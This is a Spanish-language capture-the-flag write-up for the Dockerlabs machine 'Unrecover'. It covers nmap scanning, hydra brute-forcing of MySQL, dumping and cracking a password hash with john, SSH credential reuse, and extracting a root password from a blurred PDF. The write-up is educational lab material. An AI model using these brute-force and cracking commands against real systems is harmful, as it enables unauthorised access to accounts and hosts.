---
title: Unrecover - Medium (Dockerlabs)
permalink: /Unrecover-Dockerlabs-Writeup/
tags:
  - "Linux"
  - "Medium"
  - "Hash Cracking"
  - "MySQL"
categories:
  - writeup
  - hacking
  - dockerlabs
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Unrecover - Medium (Dockerlabs)
seo_description: Haz uso de fuerza bruta y análisis de archivos para comprometer vencer Unrecover.
excerpt: Haz uso de fuerza bruta y análisis de archivos para comprometer vencer Unrecover.
header:
  overlay_image: /assets/images/headers/unrecover-dockerlabs.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/unrecover-dockerlabs.jpg
---

![image-center](/assets/images/posts/unrecover-dockerlabs.png){: .align-center}

**Habilidades:** MySQL Credentials Bruteforcing - `hydra`, Hash Cracking, Text Extraction from PDF File
{: .notice--primary}

# Introducción

Unrecover es una máquina de la plataforma Dockerlabs de dificultad `Media` donde aprenderemos conceptos de explotación en bases de datos MySQL. Esta máquina enfatiza en el uso de técnicas de fuerza bruta a servicios y contraseñas. Cuando logremos adentrarnos en el sistema operativo, se nos presentará un gran desafío que a tu capacidad de visión.

<br>

# Reconocimiento
---
En este caso podemos identificar la IP de la máquina víctima con un nombre de dominio y agregarlo al archivo `/etc/hosts`

~~~ bash
echo '172.17.0.2 unrecover.dl' >> /etc/hosts

# Haremos un ping para comprobar que tengamos comunicación con la máquina
ping unrecover.dl -c1

PING unrecover.dl (172.17.0.2) 56(84) bytes of data.
64 bytes from unrecover.dl (172.17.0.2): icmp_seq=1 ttl=64 time=0.086 ms

--- unrecover.dl ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.086/0.086/0.086/0.000 ms
~~~


## Nmap 

Comenzaremos la fase de reconocimiento con un escaneo de puertos abiertos, con esto podremos detectar servicios expuestos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn unrecover.dl -oG openPorts -v
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 08:59 EST
Initiating ARP Ping Scan at 08:59
Scanning unrecover.dl (172.17.0.2) [1 port]
Completed ARP Ping Scan at 08:59, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:59
Scanning unrecover.dl (172.17.0.2) [65535 ports]
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 3306/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 08:59, 1.20s elapsed (65535 total ports)
Nmap scan report for unrecover.dl (172.17.0.2)
Host is up (0.000012s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Una vez hemos detectado puertos abiertos, haremos un segundo escaneo más exhaustivo sobre estos puertos con el fin de identificar la versión y el servicio que se está ejecutando en cada puerto

~~~ bash
nmap -sVC -p 21,22,80,3306 unrecover.dl -oN services                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 09:01 EST
Nmap scan report for unrecover.dl (172.17.0.2)
Host is up (0.000064s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 04:81:76:01:7f:ac:bd:15:ea:2b:24:10:c2:7c:56:5f (ECDSA)
|_  256 73:c2:da:cb:47:d7:a9:40:1e:c6:11:bf:09:9c:b2:a3 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Zoo de Capybaras
3306/tcp open  mysql   MySQL 5.5.5-10.11.6-MariaDB-0+deb12u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 35
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, Support41Auth, SupportsTransactions, FoundRows, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsCompression, InteractiveClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ls~Blx:Rq_ju-}Q\\9G;
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Podemos ver varios servicios como `ftp`, `http` y `mysql`, procederemos a intentar enumerar información en cada uno de estos puertos. En este punto intentaremos inicios de sesión anónimos frente a `ftp` o credenciales por defecto en `mysql`, además de `fuzzing`. Sin embargo ya les adelanto que no podremos ingresar con estas técnicas ni tampoco encontraremos información relevante en la web usando diccionarios comunes


## Web Analysis

Como el puerto `80` se encuentra expuesto, podemos dirigirnos a la IP o el nombre de dominio en el navegador

![image-center](/assets/images/posts/unrecover-web.png){: .align-center}

La página corresponde a un `Zoo` de capybaras, muy tiernos por cierto. Además se nos da la bienvenida como el usuario `capybara`, esto ya nos da una pista sobre un usuario válido dentro de un servicio


# Intrusión / Explotación
---
## MySQL Credentials Bruteforcing

Podemos intentar ataques de fuerza bruta a los diversos servicios empleando el usuario `capybara`, sin embargo luego de algunas pruebas solamente he obtenido resultados contra el servicio de `mysql`

~~~ bash
hydra -l capybara -P /usr/share/wordlists/rockyou.txt mysql://unrecover.dl
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-08 10:53:40
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://unrecover.dl:3306/
[3306][mysql] host: unrecover.dl   login: capybara   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-08 10:53:42
~~~

Hemos encontrado la contraseña `password1` para el usuario `capybara` para el servicio `mysql`, en este punto además de conectarnos, es importante **validar si estas credenciales se reutilizan en otros servicios expuestos**

~~~ bash
mysql -u capybara -h unrecover.dl -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 101
Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
~~~

Listaremos la información dentro de las bases de datos existentes ya sea nombres de usuario, contraseñas o cualquier información que nos pueda ayudar con la intrusión

~~~
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| beta               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [(none)]> use beta;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [beta]> show tables;
+----------------+
| Tables_in_beta |
+----------------+
| registraton    |
+----------------+
1 row in set (0.001 sec)

MariaDB [beta]> select * from registraton;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | balulero | 520d3142a140addb8be7d858a7e29e15 |
+----+----------+----------------------------------+
1 row in set (0.001 sec)

MariaDB [beta]> 
~~~


## Hash Cracking

Si identificamos el hash con `hashid` para identificar el algoritmo usado, la herramienta nos sugiere que se trata de un hash `MD2`

~~~ bash
hashid 520d3142a140addb8be7d858a7e29e15
Analyzing '520d3142a140addb8be7d858a7e29e15'
[+] MD2 # El más probable
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
~~~

Procedemos a crackear este hash con `john` o herramientas online como `crackstation.net`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=MD2       
Using default input encoding: UTF-8
Loaded 1 password hash (MD2 [MD2 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (?)     
1g 0:00:00:00 DONE (2025-03-08 09:55) 100.0g/s 25600p/s 25600c/s 25600C/s 123456..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

Obtendremos la misma contraseña que para el usuario `capybara`, pero en la base de datos está registrada con el nombre `balulero`, intentaremos usar esta contraseña en los servicios correspondientes

~~~ bash
ssh balulero@unrecover.dl
balulero@unrecover.dl\'s password: 
Linux d681f83f90f6 6.10.11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.10.11-1parrot1 (2024-10-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
balulero@d681f83f90f6:~$
balulero@d681f83f90f6:~$ export TERM=xterm
~~~

En este ejemplo cambiamos la variable de entorno `TERM` para que su valor sea `xterm` y así poder hacer uso de `Ctrl + L`



# Escalada de Privilegios
---
Si listamos los archivos en el directorio actual, veremos un directorio `server`

~~~ bash
balulero@d681f83f90f6:~$ ls -la 
total 12
drwx------ 1 balulero balulero   66 Feb  2 10:53 .
drwxr-xr-x 1 root     root       16 Feb  2 10:51 ..
-rw-r--r-- 1 balulero balulero  220 Feb  2 10:51 .bash_logout
-rw-r--r-- 1 balulero balulero 3526 Feb  2 10:51 .bashrc
-rw-r--r-- 1 balulero balulero  807 Feb  2 10:51 .profile
drwxr-xr-x 1 root     root       20 Feb  2 11:27 server

balulero@d681f83f90f6:~$ cd server 
balulero@d681f83f90f6:~/server$ ls -la
total 32
drwxr-xr-x 1 root     root        20 Feb  2 11:27 .
drwx------ 1 balulero balulero    66 Feb  2 10:53 ..
-rw-r--r-- 1 root     root     31654 Feb  2 11:21 backup.pdf
~~~


### HTTP Server

Una forma de transferirnos este archivo a nuestra máquina atacante es haciendo uso de `python3` para iniciar un servidor HTTP por un puerto que no sea el `80` (porque está siendo utilizado por apache)

~~~ bash
balulero@d681f83f90f6:~/server$ which python3 
/usr/bin/python3
balulero@d681f83f90f6:~/server$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.1 - - [08/Mar/2025 15:03:59] "GET /backup.pdf HTTP/1.1" 200 -
~~~

Desde nuestra máquina descargamos el archivo `backup.pdf`

~~~ bash
wget http://unrecover.dl:8000/backup.pdf
--2025-03-08 10:03:59--  http://unrecover.dl:8000/backup.pdf
Resolving unrecover.dl (unrecover.dl)... 172.17.0.2
Connecting to unrecover.dl (unrecover.dl)|172.17.0.2|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31654 (31K) [application/pdf]
Saving to: ‘backup.pdf’

backup.pdf                                    100%[================================================================================================>]  30.91K  --.-KB/s    in 0s      

2025-03-08 10:03:59 (68.6 MB/s) - ‘backup.pdf’ saved [31654/31654]
~~~


## PDF Analysis

En este punto analizaremos la información que contiene este archivo, iniciando con los metadatos, sin embargo, no encontraremos algo relevante en los metadatos o los caracteres imprimibles del `pdf`

Otra cosa que podemos hacer es ver el `pdf` (lógicamente). Si somos demasiado frikis y no tenemos un entorno nativo de `kali` o `parrot`, podemos usar el comando `open` para abrir el directorio actual con una interfaz gráfica

~~~ bash
open .
~~~

![image-center](/assets/images/posts/unrecover-view-file.png){: .align-center}

## Text Extraction

Vemos que se nos está dando la contraseña del usuario `root` supuestamente, pero la contraseña aparece en un formato `borroso`. Lo que podemos hacer si somos tan ciegos como para no poder leer la contraseña es hacer un tratamiento para convertir el `pdf` a una imagen `png` e intentar extraer el texto con alguna herramienta en línea como la siguiente

- https://www.prepostseo.com/es/image-to-text

Primero convertiremos el `pdf` en una imagen `png`

~~~ bash
pdftoppm -png backup.pdf imagen
~~~

Ahora mejoramos un poco la calidad de la imagen y le damos contraste

~~~ bash
convert imagen-1.png -sharpen 0x3 -contrast backup-best.png
~~~

Nos dirigimos a la herramienta online para extraer texto. Logramos extraer el siguiente texto

~~~ text
Backup password
La contraseña del usuario root es passwordpepinaca
~~~

Entonces usamos esta contraseña para el usuario `root`

~~~ bash
su root
Password: 
root@d681f83f90f6:/home/balulero/server\# id
uid=0(root) gid=0(root) groups=0(root)
~~~
